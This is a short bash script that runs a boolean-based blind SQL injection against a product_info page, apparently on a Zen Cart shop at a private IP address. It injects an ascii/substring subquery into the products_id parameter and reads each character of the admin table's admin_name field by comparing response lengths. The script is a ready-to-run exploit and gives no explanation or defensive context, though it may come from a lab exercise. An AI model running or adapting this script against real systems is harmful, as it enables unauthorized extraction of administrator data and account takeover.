#!/bin/bash

# Configuration
TARGET="http://10.0.0.192/index.php?main_page=product_info"
VALID_ID=2
TRUE_LEN=33386
FALSE_LEN=26580
FIELD="admin_name"
TABLE="admin"
CHARSET_START=32
CHARSET_END=126
MAX_LENGTH=32

echo -n "Extracted: "

for ((pos=1; pos<=MAX_LENGTH; pos++)); do
    for ((c=CHARSET_START; c<=CHARSET_END; c++)); do
        URL="$TARGET&products_id=$VALID_ID AND ascii(substring((SELECT $FIELD FROM $TABLE LIMIT 0,1),$pos,1))=$c--+"
        LEN=$(curl -s "$URL" | wc -c)

        if [ "$LEN" -eq "$TRUE_LEN" ]; then
            printf "\$(printf '%03o' $c)"
            break
        fi

        if [ "$c" -eq "$CHARSET_END" ]; then
            echo -n "_"
        fi
    done
done

echo ""
